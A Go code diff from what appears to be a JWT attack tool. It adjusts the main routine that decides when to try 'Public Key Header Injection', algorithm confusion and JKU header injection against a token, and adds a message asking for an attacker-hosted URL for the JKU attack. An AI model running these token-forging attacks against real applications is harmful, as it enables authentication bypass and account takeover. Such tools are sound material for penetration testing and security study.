@@ -3,6 +3,7 @@ package attacks
 import (
 	"JWTechniques/ctrl"
 	"fmt"
+	"strings"
 
 	"github.com/golang-jwt/jwt/v5"
 )
@@ -43,8 +44,8 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 		fmt.Print("------------------------------------------------------\n\n")
 
 		//Check if the algo used is an asymmetric algorithm, which can possibly lead to "Algorithm Confusion" and "Public Key Header Injection" attacks
-		algStr := alg.(string)
-		if algStr != "HS256" && algStr != "HS384" && algStr != "HS512" {
+		algStr := strings.ToLower(alg.(string))
+		if !strings.Contains(algStr, "hs") {
 			fmt.Print("Checking if the token is vulnerable to the \"Public Key Header Injection\" attack\n\n")
 			newJWTStr = ExploitPublicKeyInjection(token, userHeader, userValue, algStr)
 			if newJWTStr != "" {
@@ -73,14 +74,19 @@ func MainMagic(jwtStr string, userHeader string, userValue string, publicKey str
 		fmt.Print("------------------------------------------------------\n\n")
 	}
 
-	if _, ok := token.Header["jku"]; ok && url != "" {
-		fmt.Print("Your token contains the \"JKU\" header, it may be exploitable through header injection\n\n")
-		newJWTStr, err := ExploitJKU(token, userHeader, userValue, url, false)
-		if err == nil {
-			fmt.Printf("JKU header injection  : %s\n\n", newJWTStr)
+	if _, ok := token.Header["jku"]; ok {
+		fmt.Print("Your token contains the \"JKU\" header, it may be exploitable through header injection\n")
+		if url != "" {
+			newJWTStr, err := ExploitJKU(token, userHeader, userValue, url, false)
+			if err == nil {
+				fmt.Printf("JKU header injection  : %s\n\n", newJWTStr)
+			} else {
+				fmt.Printf("Error while trying to exploit the \"JKU injection\" attack : %s\n", err)
+			}
 		} else {
-			fmt.Printf("Error while trying to exploit the \"JKU injection\" attack : %s\n", err)
+			fmt.Printf("For this attack to work, you should provide an URL (with -u) from which the victim can fetch a file\n")
 		}
+
 		fmt.Print("------------------------------------------------------\n\n")
 	}
 
